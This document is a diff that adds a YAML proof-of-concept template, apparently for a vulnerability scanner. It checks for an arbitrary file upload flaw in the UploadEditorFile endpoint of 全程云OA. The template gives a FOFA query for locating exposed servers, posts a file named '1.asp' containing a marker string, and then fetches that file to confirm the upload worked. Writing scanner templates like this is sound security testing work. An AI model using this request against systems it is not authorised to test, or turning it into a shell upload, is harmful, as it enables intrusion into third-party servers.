@@ -1,0 +1,31 @@
+id: poc-yaml-quan-cheng-yun-uploadeditorfile-anyfile-upload
+info:
+  name: 全程云OA UploadEditorFile接口存在任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 全程云OA
+  fofa: body="全程云OA" || body="images/yipeoplehover.png"
+variables:
+  t1: random_str(8)
+requests:
+- method: POST
+  path: /OA/api/2.0/Common/AttachFile/UploadEditorFile
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNe8DcVuv1vEUWDaR
+  data: '------WebKitFormBoundaryNe8DcVuv1vEUWDaR
+
+    Content-Disposition: form-data; name="upload";filename="1.asp"
+
+
+    This website has a vulnerability{{.t1}}
+
+    ------WebKitFormBoundaryNe8DcVuv1vEUWDaR--'
+  expression: status_code == 200 && contains(body,"\"filePath\":")
+  output:
+  - regex_match(body,`"filePath":"(?P<filepath>.*?).asp"`)
+- method: GET
+  path: /{{.filepath}}.asp
+  expression: "status_code == 200 && \ncontains(body,t1) && \ncontains(body,\"This\
+    \ website has a vulnerability\")\n"
+transport: http
